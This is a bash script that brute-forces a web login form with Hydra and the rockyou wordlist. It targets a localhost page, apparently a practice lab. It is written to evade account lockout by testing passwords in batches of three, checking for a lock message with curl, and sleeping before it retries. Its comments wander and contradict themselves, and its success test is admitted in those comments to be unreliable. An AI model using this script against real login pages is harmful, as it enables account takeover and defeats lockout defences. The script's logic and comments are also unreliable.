#!/bin/bash

# --- CONFIGURATION ---
USER="admin@admin.admin"
WORDLIST="rockyou.txt"
URL="http://localhost/hydra/login.php"
# The message that indicates the account is locked
LOCK_MSG="Account temporary locked"
# The standard failure message (used to define the Hydra command)
FAIL_MSG="Wrong password!"
# How many attempts before checking (keep this lower than the lock threshold)
BATCH_SIZE=3
# How long to sleep (in seconds) if locked
SLEEP_TIME=60
# ---------------------

# Create a temporary directory for wordlist chunks
mkdir -p temp_chunks
echo "[*] Splitting wordlist into chunks of $BATCH_SIZE..."
split -l $BATCH_SIZE $WORDLIST temp_chunks/chunk_

# Loop through each chunk file
for file in temp_chunks/chunk_*; do
    
    # Infinite loop for the current chunk (allows retrying)
    while true; do
        echo "[-] Testing batch: $file"
        
        # Run Hydra on the current small file
        # We capture both stdout and stderr (2>&1) into a variable
        OUTPUT=$(hydra -l $USER -P $file -t 1 -o /dev/null localhost http-form-post "/hydra/login.php:email=^USER^&password=^PASS^&submit=Submit:F=$FAIL_MSG" 2>&1)

        # CHECK 1: Did we find the password?
        # Hydra output contains "password:" when successful (and not part of an error message)
        if echo "$OUTPUT" | grep -q "host: localhost"; then
             echo ""
             echo "#############################################"
             echo "[+] SUCCESS FOUND!"
             # Extract the line containing the password
             echo "$OUTPUT" | grep "login:" 
             echo "#############################################"
             
             # Cleanup and Exit
             rm -rf temp_chunks
             exit 0
        fi

        # CHECK 2: Is the account locked?
        # Note: Since Hydra filters by "F=Wrong password", a "Locked" message 
        # technically looks like a success to Hydra (false positive). 
        # We must grep the OUTPUT to see if Hydra showed a false positive result 
        # or if we need to manually curl to verify.
        
        # ACTUALLY: The most reliable way when Hydra is confused is to use curl 
        # to check the server status if Hydra returns a "potential" success 
        # that isn't real. 
        # BUT, simpler logic for this script:
        
        # If Hydra claims to find a password, it might actually be the "Locked" message
        # because the "Wrong password!" text was missing.
        # So we verify the "found" password logic:
        
        # Let's check if the raw response actually contained the lock message.
        # Hydra doesn't easily show raw response body in script output.
        
        # ALTERNATIVE CHECK: 
        # If we suspect a lock, we probe the server once.
        TEST_RESP=$(curl -s -d "email=$USER&password=CheckLockStatus&submit=Submit" $URL)
        
        if [[ "$TEST_RESP" == *"$LOCK_MSG"* ]]; then
            echo "[!] DETECTED LOCKOUT! Sleeping for $SLEEP_TIME seconds..."
            sleep $SLEEP_TIME
            echo "[*] Resuming..."
            # The 'while' loop triggers again, retrying this same 'file' (chunk)
            continue 
        else
            # If not locked, and Hydra didn't find the password, move to next chunk
            break
        fi
    done
done

# Cleanup
rm -rf temp_chunks
echo "[*] Wordlist finished. No password found."